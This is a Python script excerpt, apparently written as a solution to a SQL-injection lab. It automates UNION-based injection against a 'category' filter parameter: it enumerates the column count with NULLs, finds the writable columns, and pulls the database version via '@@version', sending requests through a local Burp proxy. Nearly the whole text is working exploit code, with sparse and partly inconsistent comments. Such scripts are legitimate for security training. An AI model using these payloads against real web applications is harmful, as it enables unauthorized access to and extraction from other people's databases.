...
def column_enumeration(base_url: str) -> int: # the function column enumeration expects 1 argument called base_url,in the format of a string, and it returns an int variable which is the count
    ...
    while True:    
        response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT {null}-- '},#fstring for nulls to dynamically add it in, needed to escape the ' before UNION so used \. ORACLE queriies need a FROM
...
def writeable_columns(column_number: int, base_url: str) -> None:  
    for count in range(2): #as we have 2 columns we need to stop at 2
        ...
        response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT {letter[0]}, {letter[1]}-- '},#fstring for nulls, adding the leters in for nulls to dynamically add it in, needed to escape the ' before UNION so used \. ORACLE UNION queries need a FROM
            proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            verify=False,
        )  # category is the key and the value is clothing, everything after the ? are the parameters in the URL also sending through Burp
...
def extract_info(base_url: str) -> None:
    response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT NULL,@@version-- '},#fstring with sqli payload to look for version info, Oracle queries need a FROM. used a null so nothing in first columns then output in second
            proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            verify=False,
    )
    print(response.text)
